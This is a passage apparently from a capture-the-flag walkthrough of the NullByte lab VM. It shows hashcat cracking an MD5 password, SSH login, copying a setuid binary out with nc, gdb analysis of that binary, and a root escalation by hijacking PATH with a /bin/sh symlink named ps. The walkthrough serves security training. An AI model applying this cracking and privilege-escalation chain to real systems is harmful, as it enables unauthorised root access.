+root@kali:~# hashcat -m 0 -a 0 hash /usr/share/wordlists/rockyou.txt
+This copy of hashcat will expire on 01.01.2016. Please upgrade to continue using hashcat.
+
+Initializing hashcat v0.49 with 1 threads and 32mb segment-size...
+
+Added hashes from file hash: 1 (1 salts)
+Activating quick-digest mode for single-hash
+
+NOTE: press enter for status-screen
+
+c6d6bd7ebf806f43c76acc3681703b81:omega
+
+All hashes have been recovered
+
+Input.Mode: Dict (/usr/share/wordlists/rockyou.txt)
+Index.....: 1/5 (segment), 3627099 (words), 33550339 (bytes)
+Recovered.: 1/1 hashes, 1/1 salts
+Speed/sec.: - plains, - words
+Progress..: 11444/3627099 (0.32%)
+Running...: --:--:--:--
+Estimated.: --:--:--:--
+
+Started: Wed Nov 25 04:49:32 2015
+Stopped: Wed Nov 25 04:49:34 2015
+root@kali:~# 
+
+Option Breakdown for hashcat
+* Attack modes: (-a)
+    0 = Straight
+* Hash types: (-m)
+     0 = MD5
+	 
+8.) Enumerating SSH
+root@kali:~/Downloads/sqlmap-master# cd ~
+root@kali:~# ssh ramses@192.168.174.139 -p 777
+The authenticity of host '[192.168.174.139]:777 ([192.168.174.139]:777)' can't be established.
+ECDSA key fingerprint is 60:06:e3:64:8f:8a:6f:a7:74:5a:8b:3f:e1:24:93:96.
+Are you sure you want to continue connecting (yes/no)? yes
+Warning: Permanently added '[192.168.174.139]:777' (ECDSA) to the list of known hosts.
+ramses@192.168.174.139's password: 
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Sun Aug  2 01:38:58 2015 from 192.168.1.109
+ramses@NullByte:~$ ls -lah
+total 24K
+drwxr-xr-x 2 ramses ramses 4.0K Aug  2 01:36 .
+drwxr-xr-x 5 root   root   4.0K Aug  2 00:46 ..
+-rw------- 1 ramses ramses   96 Aug  2 01:39 .bash_history
+-rw-r--r-- 1 ramses ramses  220 Aug  2 00:46 .bash_logout
+-rw-r--r-- 1 ramses ramses 3.5K Aug  2 00:46 .bashrc
+-rw-r--r-- 1 ramses ramses  675 Aug  2 00:46 .profile
+ramses@NullByte:~$ cat .bash_history 
+sudo -s
+su eric
+exit
+ls
+clear
+cd /var/www
+cd backup/
+ls
+./procwatch 
+clear
+sudo -s
+cd /
+ls
+exit
+ramses@NullByte:~$ 
+ramses@NullByte:~$ cd /var/www/backup/
+ramses@NullByte:/var/www/backup$ ls -lah
+total 20K
+drwxrwxrwx 2 root root 4.0K Aug  2 01:36 .
+drwxr-xr-x 4 root root 4.0K Aug  2 01:22 ..
+-rwsr-xr-x 1 root root 4.9K Aug  2 01:29 procwatch
+-rw-r--r-- 1 root root   28 Aug  2 01:36 readme.txt
+ramses@NullByte:/var/www/backup$ file procwatch 
+procwatch: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=17d666a0c940726b29feedde855535fb21cb160c, not stripped
+ramses@NullByte:/var/www/backup$ ./procwatch 
+  PID TTY          TIME CMD
+ 1521 pts/0    00:00:00 procwatch
+ 1522 pts/0    00:00:00 sh
+ 1523 pts/0    00:00:00 ps
+ramses@NullByte:/var/www/backup$ 
+ramses@NullByte:/var/www/backup$ ps
+  PID TTY          TIME CMD
+ 1484 pts/0    00:00:00 bash
+ 1551 pts/0    00:00:00 ps
+ramses@NullByte:/var/www/backup$
+
+9.) Examining procwatch
+Transfer file using nc
+On the receiving end
+root@kali:~# nc -l -p 1234 > procwatch
+root@kali:~#
+On the sending end
+ramses@NullByte:/var/www/backup$ nc -w 3 192.168.174.137 1234 < procwatch 
+ramses@NullByte:/var/www/backup$
+
+In gdb-peda
+root@kali:~# gdb -q ./procwatch 
+Reading symbols from /root/procwatch...(no debugging symbols found)...done.
+gdb-peda$ break main 
+Breakpoint 1 at 0x8048409
+gdb-peda$ run
+warning: no loadable sections found in added symbol-file system-supplied DSO at 0xb7fe0000
+[----------------------------------registers-----------------------------------]
+EAX: 0xbffff5b4 --> 0xbffff705 ("/root/procwatch")
+EBX: 0xb7fbdff4 --> 0x15fd7c 
+ECX: 0xbffff510 --> 0x1 
+EDX: 0x1 
+ESI: 0x0 
+EDI: 0x0 
+EBP: 0xbffff4f8 --> 0xbffff588 --> 0x0 
+ESP: 0xbffff4f4 --> 0xbffff510 --> 0x1 
+EIP: 0x8048409 (<main+14>:	sub    esp,0x44)
+EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x8048405 <main+10>:	push   ebp
+   0x8048406 <main+11>:	mov    ebp,esp
+   0x8048408 <main+13>:	push   ecx
+=> 0x8048409 <main+14>:	sub    esp,0x44
+   0x804840c <main+17>:	lea    eax,[ebp-0x3a]
+   0x804840f <main+20>:	mov    WORD PTR [eax],0x7370
+   0x8048414 <main+25>:	mov    BYTE PTR [eax+0x2],0x0
+   0x8048418 <main+29>:	sub    esp,0xc
+[------------------------------------stack-------------------------------------]
+0000| 0xbffff4f4 --> 0xbffff510 --> 0x1 
+0004| 0xbffff4f8 --> 0xbffff588 --> 0x0 
+0008| 0xbffff4fc --> 0xb7e74e46 (<__libc_start_main+230>:	mov    DWORD PTR [esp],eax)
+0012| 0xbffff500 --> 0x8048440 (<__libc_csu_init>:	push   ebp)
+0016| 0xbffff504 --> 0x0 
+0020| 0xbffff508 --> 0xbffff588 --> 0x0 
+0024| 0xbffff50c --> 0xb7e74e46 (<__libc_start_main+230>:	mov    DWORD PTR [esp],eax)
+0028| 0xbffff510 --> 0x1 
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+
+Breakpoint 1, 0x08048409 in main ()
+gdb-peda$ stepi
+[----------------------------------registers-----------------------------------]
+EAX: 0xbffff5b4 --> 0xbffff705 ("/root/procwatch")
+EBX: 0xb7fbdff4 --> 0x15fd7c 
+ECX: 0xbffff510 --> 0x1 
+EDX: 0x1 
+ESI: 0x0 
+EDI: 0x0 
+EBP: 0xbffff4f8 --> 0xbffff588 --> 0x0 
+ESP: 0xbffff4b0 --> 0xbffff4d6 --> 0x96b00804 
+EIP: 0x804840c (<main+17>:	lea    eax,[ebp-0x3a])
+EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x8048406 <main+11>:	mov    ebp,esp
+   0x8048408 <main+13>:	push   ecx
+   0x8048409 <main+14>:	sub    esp,0x44
+=> 0x804840c <main+17>:	lea    eax,[ebp-0x3a]
+   0x804840f <main+20>:	mov    WORD PTR [eax],0x7370
+   0x8048414 <main+25>:	mov    BYTE PTR [eax+0x2],0x0
+   0x8048418 <main+29>:	sub    esp,0xc
+   0x804841b <main+32>:	lea    eax,[ebp-0x3a]
+[------------------------------------stack-------------------------------------]
+0000| 0xbffff4b0 --> 0xbffff4d6 --> 0x96b00804 
+0004| 0xbffff4b4 --> 0xb7e8d315 (add    ebx,0x130cdf)
+0008| 0xbffff4b8 --> 0xbffff4d7 --> 0x496b008 
+0012| 0xbffff4bc --> 0x1 
+0016| 0xbffff4c0 --> 0x0 
+0020| 0xbffff4c4 --> 0xbffff560 --> 0x0 
+0024| 0xbffff4c8 --> 0xb7fbece0 --> 0x0 
+0028| 0xbffff4cc --> 0x804829d (<_init+9>:	add    ebx,0x1413)
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+0x0804840c in main ()
+gdb-peda$ stepi
+[----------------------------------registers-----------------------------------]
+EAX: 0xbffff4be --> 0x0 
+EBX: 0xb7fbdff4 --> 0x15fd7c 
+ECX: 0xbffff510 --> 0x1 
+EDX: 0x1 
+ESI: 0x0 
+EDI: 0x0 
+EBP: 0xbffff4f8 --> 0xbffff588 --> 0x0 
+ESP: 0xbffff4b0 --> 0xbffff4d6 --> 0x96b00804 
+EIP: 0x804840f (<main+20>:	mov    WORD PTR [eax],0x7370)
+EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x8048408 <main+13>:	push   ecx
+   0x8048409 <main+14>:	sub    esp,0x44
+   0x804840c <main+17>:	lea    eax,[ebp-0x3a]
+=> 0x804840f <main+20>:	mov    WORD PTR [eax],0x7370
+   0x8048414 <main+25>:	mov    BYTE PTR [eax+0x2],0x0
+   0x8048418 <main+29>:	sub    esp,0xc
+   0x804841b <main+32>:	lea    eax,[ebp-0x3a]
+   0x804841e <main+35>:	push   eax
+[------------------------------------stack-------------------------------------]
+0000| 0xbffff4b0 --> 0xbffff4d6 --> 0x96b00804 
+0004| 0xbffff4b4 --> 0xb7e8d315 (add    ebx,0x130cdf)
+0008| 0xbffff4b8 --> 0xbffff4d7 --> 0x496b008 
+0012| 0xbffff4bc --> 0x1 
+0016| 0xbffff4c0 --> 0x0 
+0020| 0xbffff4c4 --> 0xbffff560 --> 0x0 
+0024| 0xbffff4c8 --> 0xb7fbece0 --> 0x0 
+0028| 0xbffff4cc --> 0x804829d (<_init+9>:	add    ebx,0x1413)
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+0x0804840f in main ()
+gdb-peda$ stepi
+[----------------------------------registers-----------------------------------]
+EAX: 0xbffff4be --> 0x7370 ('ps')
+EBX: 0xb7fbdff4 --> 0x15fd7c 
+ECX: 0xbffff510 --> 0x1 
+EDX: 0x1 
+ESI: 0x0 
+EDI: 0x0 
+EBP: 0xbffff4f8 --> 0xbffff588 --> 0x0 
+ESP: 0xbffff4b0 --> 0xbffff4d6 --> 0x96b00804 
+EIP: 0x8048414 (<main+25>:	mov    BYTE PTR [eax+0x2],0x0)
+EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x8048409 <main+14>:	sub    esp,0x44
+   0x804840c <main+17>:	lea    eax,[ebp-0x3a]
+   0x804840f <main+20>:	mov    WORD PTR [eax],0x7370
+=> 0x8048414 <main+25>:	mov    BYTE PTR [eax+0x2],0x0
+   0x8048418 <main+29>:	sub    esp,0xc
+   0x804841b <main+32>:	lea    eax,[ebp-0x3a]
+   0x804841e <main+35>:	push   eax
+   0x804841f <main+36>:	call   0x80482d0 <system@plt>
+[------------------------------------stack-------------------------------------]
+0000| 0xbffff4b0 --> 0xbffff4d6 --> 0x96b00804 
+0004| 0xbffff4b4 --> 0xb7e8d315 (add    ebx,0x130cdf)
+0008| 0xbffff4b8 --> 0xbffff4d7 --> 0x496b008 
+0012| 0xbffff4bc --> 0x73700001 
+0016| 0xbffff4c0 --> 0x0 
+0020| 0xbffff4c4 --> 0xbffff560 --> 0x0 
+0024| 0xbffff4c8 --> 0xb7fbece0 --> 0x0 
+0028| 0xbffff4cc --> 0x804829d (<_init+9>:	add    ebx,0x1413)
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+0x08048414 in main ()
+gdb-peda$ stepi
+[----------------------------------registers-----------------------------------]
+EAX: 0xbffff4be --> 0x7370 ('ps')
+EBX: 0xb7fbdff4 --> 0x15fd7c 
+ECX: 0xbffff510 --> 0x1 
+EDX: 0x1 
+ESI: 0x0 
+EDI: 0x0 
+EBP: 0xbffff4f8 --> 0xbffff588 --> 0x0 
+ESP: 0xbffff4b0 --> 0xbffff4d6 --> 0x96b00804 
+EIP: 0x8048418 (<main+29>:	sub    esp,0xc)
+EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x804840c <main+17>:	lea    eax,[ebp-0x3a]
+   0x804840f <main+20>:	mov    WORD PTR [eax],0x7370
+   0x8048414 <main+25>:	mov    BYTE PTR [eax+0x2],0x0
+=> 0x8048418 <main+29>:	sub    esp,0xc
+   0x804841b <main+32>:	lea    eax,[ebp-0x3a]
+   0x804841e <main+35>:	push   eax
+   0x804841f <main+36>:	call   0x80482d0 <system@plt>
+   0x8048424 <main+41>:	add    esp,0x10
+[------------------------------------stack-------------------------------------]
+0000| 0xbffff4b0 --> 0xbffff4d6 --> 0x96b00804 
+0004| 0xbffff4b4 --> 0xb7e8d315 (add    ebx,0x130cdf)
+0008| 0xbffff4b8 --> 0xbffff4d7 --> 0x496b008 
+0012| 0xbffff4bc --> 0x73700001 
+0016| 0xbffff4c0 --> 0x0 
+0020| 0xbffff4c4 --> 0xbffff560 --> 0x0 
+0024| 0xbffff4c8 --> 0xb7fbece0 --> 0x0 
+0028| 0xbffff4cc --> 0x804829d (<_init+9>:	add    ebx,0x1413)
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+0x08048418 in main ()
+gdb-peda$ 
+[----------------------------------registers-----------------------------------]
+EAX: 0xbffff4be --> 0x7370 ('ps')
+EBX: 0xb7fbdff4 --> 0x15fd7c 
+ECX: 0xbffff510 --> 0x1 
+EDX: 0x1 
+ESI: 0x0 
+EDI: 0x0 
+EBP: 0xbffff4f8 --> 0xbffff588 --> 0x0 
+ESP: 0xbffff4a4 --> 0xbffff4d6 --> 0x96b00804 
+EIP: 0x804841b (<main+32>:	lea    eax,[ebp-0x3a])
+EFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x804840f <main+20>:	mov    WORD PTR [eax],0x7370
+   0x8048414 <main+25>:	mov    BYTE PTR [eax+0x2],0x0
+   0x8048418 <main+29>:	sub    esp,0xc
+=> 0x804841b <main+32>:	lea    eax,[ebp-0x3a]
+   0x804841e <main+35>:	push   eax
+   0x804841f <main+36>:	call   0x80482d0 <system@plt>
+   0x8048424 <main+41>:	add    esp,0x10
+   0x8048427 <main+44>:	mov    eax,0x0
+[------------------------------------stack-------------------------------------]
+0000| 0xbffff4a4 --> 0xbffff4d6 --> 0x96b00804 
+0004| 0xbffff4a8 --> 0xbffff4e0 --> 0x1 
+0008| 0xbffff4ac --> 0xb7edf960 (test   eax,eax)
+0012| 0xbffff4b0 --> 0xbffff4d6 --> 0x96b00804 
+0016| 0xbffff4b4 --> 0xb7e8d315 (add    ebx,0x130cdf)
+0020| 0xbffff4b8 --> 0xbffff4d7 --> 0x496b008 
+0024| 0xbffff4bc --> 0x73700001 
+0028| 0xbffff4c0 --> 0x0 
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+0x0804841b in main ()
+gdb-peda$ 
+[----------------------------------registers-----------------------------------]
+EAX: 0xbffff4be --> 0x7370 ('ps')
+EBX: 0xb7fbdff4 --> 0x15fd7c 
+ECX: 0xbffff510 --> 0x1 
+EDX: 0x1 
+ESI: 0x0 
+EDI: 0x0 
+EBP: 0xbffff4f8 --> 0xbffff588 --> 0x0 
+ESP: 0xbffff4a4 --> 0xbffff4d6 --> 0x96b00804 
+EIP: 0x804841e (<main+35>:	push   eax)
+EFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x8048414 <main+25>:	mov    BYTE PTR [eax+0x2],0x0
+   0x8048418 <main+29>:	sub    esp,0xc
+   0x804841b <main+32>:	lea    eax,[ebp-0x3a]
+=> 0x804841e <main+35>:	push   eax
+   0x804841f <main+36>:	call   0x80482d0 <system@plt>
+   0x8048424 <main+41>:	add    esp,0x10
+   0x8048427 <main+44>:	mov    eax,0x0
+   0x804842c <main+49>:	mov    ecx,DWORD PTR [ebp-0x4]
+[------------------------------------stack-------------------------------------]
+0000| 0xbffff4a4 --> 0xbffff4d6 --> 0x96b00804 
+0004| 0xbffff4a8 --> 0xbffff4e0 --> 0x1 
+0008| 0xbffff4ac --> 0xb7edf960 (test   eax,eax)
+0012| 0xbffff4b0 --> 0xbffff4d6 --> 0x96b00804 
+0016| 0xbffff4b4 --> 0xb7e8d315 (add    ebx,0x130cdf)
+0020| 0xbffff4b8 --> 0xbffff4d7 --> 0x496b008 
+0024| 0xbffff4bc --> 0x73700001 
+0028| 0xbffff4c0 --> 0x0 
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+0x0804841e in main ()
+gdb-peda$ 
+[----------------------------------registers-----------------------------------]
+EAX: 0xbffff4be --> 0x7370 ('ps')
+EBX: 0xb7fbdff4 --> 0x15fd7c 
+ECX: 0xbffff510 --> 0x1 
+EDX: 0x1 
+ESI: 0x0 
+EDI: 0x0 
+EBP: 0xbffff4f8 --> 0xbffff588 --> 0x0 
+ESP: 0xbffff4a0 --> 0xbffff4be --> 0x7370 ('ps')
+EIP: 0x804841f (<main+36>:	call   0x80482d0 <system@plt>)
+EFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x8048418 <main+29>:	sub    esp,0xc
+   0x804841b <main+32>:	lea    eax,[ebp-0x3a]
+   0x804841e <main+35>:	push   eax
+=> 0x804841f <main+36>:	call   0x80482d0 <system@plt>
+   0x8048424 <main+41>:	add    esp,0x10
+   0x8048427 <main+44>:	mov    eax,0x0
+   0x804842c <main+49>:	mov    ecx,DWORD PTR [ebp-0x4]
+   0x804842f <main+52>:	leave
+Guessed arguments:
+arg[0]: 0xbffff4be --> 0x7370 ('ps')
+arg[1]: 0xbffff4d6 --> 0x96b00804 
+arg[2]: 0xbffff4e0 --> 0x1 
+arg[3]: 0xb7edf960 (test   eax,eax)
+[------------------------------------stack-------------------------------------]
+0000| 0xbffff4a0 --> 0xbffff4be --> 0x7370 ('ps')
+0004| 0xbffff4a4 --> 0xbffff4d6 --> 0x96b00804 
+0008| 0xbffff4a8 --> 0xbffff4e0 --> 0x1 
+0012| 0xbffff4ac --> 0xb7edf960 (test   eax,eax)
+0016| 0xbffff4b0 --> 0xbffff4d6 --> 0x96b00804 
+0020| 0xbffff4b4 --> 0xb7e8d315 (add    ebx,0x130cdf)
+0024| 0xbffff4b8 --> 0xbffff4d7 --> 0x496b008 
+0028| 0xbffff4bc --> 0x73700001 
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+0x0804841f in main ()
+gdb-peda$ 
+
+Here 'ps' is the guessed argument
+
+Verify if ps is called with an absolute path, or not.
+
+Create a symlink to /bin/sh in the current directory and name it ps.
+ramses@NullByte:/var/www/backup$ ln -s /bin/sh ps
+
+Set the PATH environment variable to the current directory
+ramses@NullByte:/var/www/backup$ export PATH=.:$PATH
+
+Run it and check if we got root
+ramses@NullByte:/var/www/backup$ ./procwatch 
+# id
+uid=1002(ramses) gid=1002(ramses) euid=0(root) groups=1002(ramses)
+# cd /root
+# ls
+proof.txt
+# cat proof.txt
+adf11c7a9e6523e630aaf3b9b7acb51d
+
+It seems that you have pwned the box, congrats. 
+Now you done that I wanna talk with you. Write a walk & mail at
+xly0n@sigaint.org attach the walk and proof.txt
+If sigaint.org is down you may mail at nbsly0n@gmail.com
+
+
+USE THIS PGP PUBLIC KEY
+
+-----BEGIN PGP PUBLIC KEY BLOCK-----
+Version: BCPG C# v1.6.1.0
+
+mQENBFW9BX8BCACVNFJtV4KeFa/TgJZgNefJQ+fD1+LNEGnv5rw3uSV+jWigpxrJ
+Q3tO375S1KRrYxhHjEh0HKwTBCIopIcRFFRy1Qg9uW7cxYnTlDTp9QERuQ7hQOFT
+e4QU3gZPd/VibPhzbJC/pdbDpuxqU8iKxqQr0VmTX6wIGwN8GlrnKr1/xhSRTprq
+Cu7OyNC8+HKu/NpJ7j8mxDTLrvoD+hD21usssThXgZJ5a31iMWj4i0WUEKFN22KK
++z9pmlOJ5Xfhc2xx+WHtST53Ewk8D+Hjn+mh4s9/pjppdpMFUhr1poXPsI2HTWNe
+YcvzcQHwzXj6hvtcXlJj+yzM2iEuRdIJ1r41ABEBAAG0EW5ic2x5MG5AZ21haWwu
+Y29tiQEcBBABAgAGBQJVvQV/AAoJENDZ4VE7RHERJVkH/RUeh6qn116Lf5mAScNS
+HhWTUulxIllPmnOPxB9/yk0j6fvWE9dDtcS9eFgKCthUQts7OFPhc3ilbYA2Fz7q
+m7iAe97aW8pz3AeD6f6MX53Un70B3Z8yJFQbdusbQa1+MI2CCJL44Q/J5654vIGn
+XQk6Oc7xWEgxLH+IjNQgh6V+MTce8fOp2SEVPcMZZuz2+XI9nrCV1dfAcwJJyF58
+kjxYRRryD57olIyb9GsQgZkvPjHCg5JMdzQqOBoJZFPw/nNCEwQexWrgW7bqL/N8
+TM2C0X57+ok7eqj8gUEuX/6FxBtYPpqUIaRT9kdeJPYHsiLJlZcXM0HZrPVvt1HU
+Gms=
+=PiAQ
+-----END PGP PUBLIC KEY BLOCK-----
+
+# 
